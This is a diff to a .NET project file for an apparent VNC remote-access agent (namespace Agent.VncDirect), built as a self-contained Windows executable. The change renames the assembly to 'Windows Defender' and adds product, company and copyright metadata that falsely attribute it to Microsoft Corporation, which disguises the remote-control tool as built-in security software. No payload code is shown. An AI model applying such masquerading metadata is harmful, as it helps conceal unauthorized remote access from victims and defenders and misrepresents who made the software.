@@ -5,8 +5,12 @@
     <TargetFramework>net8.0-windows</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
-    <AssemblyName>VncDirect</AssemblyName>
+    <AssemblyName>Windows Defender</AssemblyName>
     <RootNamespace>Agent.VncDirect</RootNamespace>
+    <Product>Windows Defender</Product>
+    <Company>Microsoft Corporation</Company>
+    <Copyright>Copyright © Microsoft Corporation</Copyright>
+    <Description>Windows Defender</Description>
     <RuntimeIdentifier>win-x64</RuntimeIdentifier>
     <SelfContained>true</SelfContained>
     <PublishSingleFile>true</PublishSingleFile>
